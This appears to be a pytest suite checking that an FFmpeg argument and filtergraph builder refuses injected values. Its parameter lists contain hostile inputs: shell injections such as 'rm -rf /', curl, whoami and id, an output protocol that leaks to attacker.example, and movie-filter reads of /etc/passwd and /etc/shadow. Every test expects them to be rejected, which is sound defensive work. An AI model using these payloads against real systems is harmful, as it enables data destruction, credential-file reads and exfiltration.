"""Tests for argument construction.

This is the security boundary of the whole platform: if a value can reach
FFmpeg's argument list unvalidated, then every other control is decoration.
These tests are therefore written as attacks rather than as happy paths.
"""

from __future__ import annotations

import pytest

from hypercompress.core.errors import UnsafeArgumentError
from hypercompress.core.ffmpeg import (
    ArgBuilder,
    build_filter_chain,
    build_window_select_graph,
)


class TestArgBuilder:
    def test_allowed_flags_build(self) -> None:
        args = ArgBuilder().opt("-c:v", "libx265").opt("-crf", 28).flag("-an")
        assert args.build() == ["-c:v", "libx265", "-crf", "28", "-an"]

    def test_unknown_flag_is_refused(self) -> None:
        # The allowlist is the control. A flag nobody has vetted does not get in
        # merely because it looks harmless.
        with pytest.raises(UnsafeArgumentError):
            ArgBuilder().opt("-vf_custom", "anything")

    @pytest.mark.parametrize(
        "payload",
        [
            "libx264; rm -rf /",
            "libx264 && curl http://example.com",
            "libx264\nrm -rf /",
            "libx264`whoami`",
            "libx264$(id)",
            "libx264|tee /etc/passwd",
            "libx264\x00truncated",
        ],
    )
    def test_shell_metacharacters_are_refused(self, payload: str) -> None:
        with pytest.raises(UnsafeArgumentError):
            ArgBuilder().opt("-c:v", payload)

    def test_paths_bypass_value_validation_but_not_safety(self, tmp_path) -> None:
        # Paths legitimately contain characters a codec name never would, so
        # they take a separate route — which must still reject control bytes.
        target = tmp_path / "a file (with brackets) [2024].mkv"
        target.write_bytes(b"x")
        assert str(target) in ArgBuilder().path("-i", target).build()

    def test_output_protocol_injection_is_refused(self) -> None:
        # FFmpeg treats an output name as a protocol specification, so an
        # unvalidated one is a network write, not just a file write.
        with pytest.raises(UnsafeArgumentError):
            ArgBuilder().opt("-f", "tee|http://attacker.example/leak")

    def test_numeric_values_are_normalised(self) -> None:
        assert ArgBuilder().opt("-crf", 23.5).build() == ["-crf", "23.5"]
        assert ArgBuilder().opt("-g", 250).build() == ["-g", "250"]


class TestFilterChain:
    def test_named_filters_compose(self) -> None:
        chain = build_filter_chain([("scale", {"w": 1280, "h": 720}), ("yadif", {"mode": 0})])
        assert chain == "scale=w=1280:h=720,yadif=mode=0"

    @pytest.mark.parametrize(
        "name",
        ["scale;movie=/etc/passwd", "movie", "amovie", "scale,crop"],
    )
    def test_filter_injection_is_refused(self, name: str) -> None:
        # ``movie`` reads arbitrary files into a filtergraph, which is a file
        # read primitive dressed up as a video filter.
        with pytest.raises((UnsafeArgumentError, ValueError)):
            build_filter_chain([(name, {})])

    def test_filter_value_injection_is_refused(self) -> None:
        with pytest.raises((UnsafeArgumentError, ValueError)):
            build_filter_chain([("scale", {"w": "1280,movie=/etc/shadow"})])


class TestWindowSelectGraph:
    def test_windows_produce_a_select_expression(self) -> None:
        graph = build_window_select_graph([(1.0, 2.0), (5.0, 6.5)])
        assert graph.startswith("select='between(t,1.000,2.000)+between(t,5.000,6.500)'")
        assert "setpts=N/FRAME_RATE/TB" in graph

    def test_audio_variant_uses_audio_filters(self) -> None:
        graph = build_window_select_graph([(0.0, 1.0)], audio=True)
        assert graph.startswith("aselect=")
        assert "asetpts" in graph

    @pytest.mark.parametrize(
        "windows",
        [
            [(2.0, 1.0)],  # end before start
            [(-1.0, 1.0)],  # negative start
            [(float("inf"), 2.0)],  # not finite
            [(1.0, 1.0)],  # zero length
        ],
    )
    def test_impossible_windows_are_refused(self, windows: list[tuple[float, float]]) -> None:
        with pytest.raises(UnsafeArgumentError):
            build_window_select_graph(windows)

    def test_empty_window_list_is_refused(self) -> None:
        with pytest.raises(ValueError):
            build_window_select_graph([])

    def test_expression_is_built_from_floats_not_strings(self) -> None:
        # The whole reason this function exists is that a select expression
        # needs commas, which the ordinary value validator refuses. It stays
        # safe because no caller string is ever interpolated — only floats.
        graph = build_window_select_graph([(1.5, 2.5)])
        assert "1.500" in graph and "2.500" in graph
        with pytest.raises((UnsafeArgumentError, TypeError, ValueError)):
            build_window_select_graph([("0);movie=/etc/passwd;(", 2.0)])  # type: ignore[list-item]
